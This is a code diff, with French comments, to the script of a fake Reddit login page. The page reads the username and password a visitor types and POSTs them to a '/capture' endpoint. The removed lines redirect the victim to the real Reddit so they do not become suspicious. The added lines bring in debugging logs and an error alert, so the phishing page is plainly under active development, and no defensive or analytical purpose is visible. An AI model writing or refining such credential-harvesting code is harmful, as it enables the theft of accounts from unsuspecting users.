@@ -116,19 +116,25 @@
         const username = event.target.querySelector('input[type="text"]').value;
         const password = event.target.querySelector('input[type="password"]').value;
 
+        // Log local pour confirmer que le bouton marche sur ton navigateur
+        console.log("Tentative d'envoi pour :", username);
+
         try {
-            // Envoi des données au serveur (remplace localhost par l'URL de ton serveur une fois en ligne)
-            // On enlève le "https://fish-production..." pour ne laisser que le chemin
-            await fetch('/capture', {
+            // Utilisation du chemin RELATIF '/'
+            // Cela envoie les données au serveur qui héberge cette page
+            const response = await fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username, password })
             });
 
-            // Redirection vers le vrai Reddit pour ne pas éveiller de soupçons
-            window.location.href = "https://www.reddit.com/login/";
+            if (response.ok) {
+                console.log("Serveur a répondu OK !");
+                // Optionnel : window.location.href = "https://reddit.com";
+            }
         } catch (error) {
-            console.error("Erreur d'envoi", error);
+            console.error("Erreur critique d'envoi :", error);
+            alert("Erreur de réseau : vérifie la console (F12)");
         }
     });
 </script>
